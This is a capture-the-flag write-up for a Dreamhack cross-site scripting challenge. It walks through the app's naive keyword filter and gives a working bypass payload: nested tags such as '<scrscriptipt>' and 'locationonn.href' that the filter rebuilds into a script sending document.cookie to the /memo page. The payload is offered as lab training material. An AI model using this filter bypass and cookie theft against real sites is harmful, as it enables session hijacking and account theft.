---
title: "[Dreamhack] XSS Filtering Bypass"
date: 2026-04-08 15:00:00 +1100
categories: [CTF Writeup, Web Hacking]
tags: [dreamhack, xss]     # TAG names should always be lowercase
---

## Challenge Overview
- Challenge: XSS Filtering Bypass
- Platform: Dreamhack
- Category: Web — Cross-Site Scripting

## Source Code Analysis  

First, analyse the contents of `index.html`.

```python
{% extends "base.html" %}
{% block title %}Index{% endblock %}

{% block head %}
  {{ super() }}
  <style type="text/css">
    .important { color: #336699; }
  </style>
{% endblock %}

{% block content %}
<p class="important"><a href="/vuln?param=<img src=https://dreamhack.io/assets/:"></a></p>
<p class="important"><a href="/memo?memo=hello">memo</a></p>
<p class="important"><a href="/flag">flag</a></p>
{% endblock %}
```

The memo page has a default output value of `hello`.

Now analyse `app.py`.

```python
try:
    FLAG = open("./flag.txt", "r").read()
except:
    FLAG = "[**FLAG**]"
```

The content of `flag.txt` is stored in the `FLAG` variable.

Next, check how input is processed.

```python
def read_url(url, cookie={"name": "name", "value": "value"}):
    cookie.update({"domain": "127.0.0.1"})
    try:
        service = Service(executable_path="/chromedriver")
        options = webdriver.ChromeOptions()
        for _ in [
            "headless",
            "window-size=1920x1080",
            "disable-gpu",
            "no-sandbox",
            "disable-dev-shm-usage",
        ]:
            options.add_argument(_)
        driver = webdriver.Chrome(service=service, options=options)
        driver.implicitly_wait(3)
        driver.set_page_load_timeout(3)
        driver.get("http://127.0.0.1:8000/")
        driver.add_cookie(cookie)
        driver.get(url)
    except Exception as e:
        driver.quit()
        return False
    driver.quit()
    return True
```

From `read_url`, we can understand the execution flow when input is provided.

```python
def check_xss(param, cookie={"name": "name", "value": "value"}):
    url = f"http://127.0.0.1:8000/vuln?param={urllib.parse.quote(param)}"
    return read_url(url, cookie)
```

```python
def xss_filter(text):
    _filter = ["script", "on", "javascript:"]
    for f in _filter:
        if f in text.lower():
            text = text.replace(f, "")
    return text
```

Now analyse the `/flag` endpoint.

```python
@app.route("/flag", methods=["GET", "POST"])
def flag():
    if request.method == "GET":
        return render_template("flag.html")
    elif request.method == "POST":
        param = request.form.get("param")
        if not check_xss(param, {"name": "flag", "value": FLAG.strip()}):
            return '<script>alert("wrong??");history.go(-1);</script>'

        return '<script>alert("good");history.go(-1);</script>'
```

At `/flag`, the user input is taken and passed into the `check_xss` function together with a cookie object:

```python
{"name": "flag", "value": FLAG.strip()}
```

This is the key point. The cookie is explicitly created with the name "flag" and the value set to the contents of the FLAG variable. This cookie is then passed into read_url.

Inside read_url, we can see:

```python
driver.add_cookie(cookie)
```

This confirms that the cookie is added to the browser before visiting the attacker-controlled URL. Therefore, when the headless browser loads the page, the FLAG is already stored as a cookie.

Now analyse the `/memo` endpoint.

```python
@app.route("/memo")
def memo():
    global memo_text
    text = request.args.get("memo", "")
    memo_text += text + "\n"
    return render_template("memo.html", memo=memo_text)
```

The `/memo` endpoint displays the value stored in the memo parameter.

## FLAG Retrieval  

Although there is an XSS filter, it only removes specific keywords, so it can be bypassed.

The key idea is that the filter simply removes matching substrings without understanding HTML structure. This allows us to intentionally craft strings that become valid after the filtering process.

For example:

```html
<scrscriptipt>
```

After removing "script":

```html
<script>
```

Similarly:

```html
locationonn.href
```

After removing "on":

```html
location.href
```

Now consider the intended payload:

```html
<script>
location.href="/memo?memo=" + document.cookie
</script>
```

This sends document.cookie to the /memo page.

However, it is blocked because:

- script is filtered  
- on inside location is filtered  

To bypass this:

```html
<scrscriptipt>
locationonn.href="/memo?memo=" + document.cookie
</scrscriptipt>
```

After filtering:

```html
<script>
location.href="/memo?memo=" + document.cookie
</script>
```

## 3. Result  

The FLAG is sent to /memo and displayed.
